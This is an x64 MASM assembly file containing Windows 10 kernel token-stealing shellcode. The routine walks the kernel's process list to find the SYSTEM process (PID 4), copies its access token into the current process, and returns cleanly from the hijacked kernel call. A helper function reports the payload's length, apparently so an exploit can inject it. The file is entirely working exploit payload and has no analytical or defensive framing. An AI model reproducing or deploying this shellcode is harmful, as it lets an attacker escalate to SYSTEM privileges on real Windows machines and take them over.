_DATA SEGMENT
_DATA ENDS

_TEXT    SEGMENT

;;;
;;; Copy the system token to the current process
;;;

PUBLIC CopySystemToken
CopySystemToken PROC
    jmp CopySystemToken_Win10
CopySystemToken ENDP

PUBLIC CopySystemTokenLength
CopySystemTokenLength PROC
    jmp CopySystemTokenLength_Win10
CopySystemTokenLength ENDP


;;;
;;; OS specific shellcodes
;;;

PUBLIC CopySystemToken_Win10
CopySystemToken_Win10 PROC
	push rax
	push rbx
	push rcx

    ;;; nt!PsGetCurrentProcess
	mov rax, gs:[0188h]
	mov rax, [rax+00b8h]
	mov rbx, rax
	mov rbx, [rbx+02f0h]

    ;;; look for SYSTEM EProcess
    __loop:
    sub rbx, 02f0h
    mov rcx, [rbx+02e8h]
    cmp rcx, 4
    jnz __loop

    ;;; get its token value
    mov rcx, [rbx + 0360h]
    and cl, 0f0h

	;;; overwrite our current process' token with it
    mov [rax + 0360h], rcx
    pop rcx
    pop rbx
    pop rax
    add rsp, 028h
    xor rax, rax
    ret
CopySystemToken_Win10 ENDP
CopySystemToken_Win10_end::

PUBLIC CopySystemTokenLength_Win10
CopySystemTokenLength_Win10 PROC
  mov rax, OFFSET CopySystemToken_Win10_end
  mov rcx, OFFSET CopySystemToken_Win10
  sub rax, rcx
  ret
CopySystemTokenLength_Win10 ENDP

_TEXT    ENDS
END
